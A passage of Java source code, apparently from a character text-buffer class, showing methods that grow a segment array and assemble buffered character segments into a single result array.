curr2=_charArray(Math.min(MAX_SEGMENT_LEN,oldLen + sizeAddition));     this._currentSize=0;     this._currentSegment=curr2;   }   private char[] buildResultArray(){     char[] result;     if (this._resultString != null) {       return this._resultString.toCharArray();     }     if (this._inputStart >= 0) {       if (this._inputLen < 1) {         return NO_CHARS;       }       result=_charArray(this._inputLen);       System.arraycopy(this._inputBuffer,this._inputStart,result,0,this._inputLen);     }  else {       int size=size();       if (size < 1) {         return NO_CHARS;       }       int offset=0;       result=_charArray(size);       if (this._segments != null) {         int len=this._segments.size();         for (int i=0; i < len; i++) {           char[] curr=this._segments.get(i);           int currLen=curr.length;           System.arraycopy(curr,0,result,offset,currLen);           offset+=currLen;         }       }       System.arraycopy(this._currentSegment,0,result,offset,this._currentSize);     }     return result;   }   private final char[] _charArray(  int len){     return new char[len];   } } "
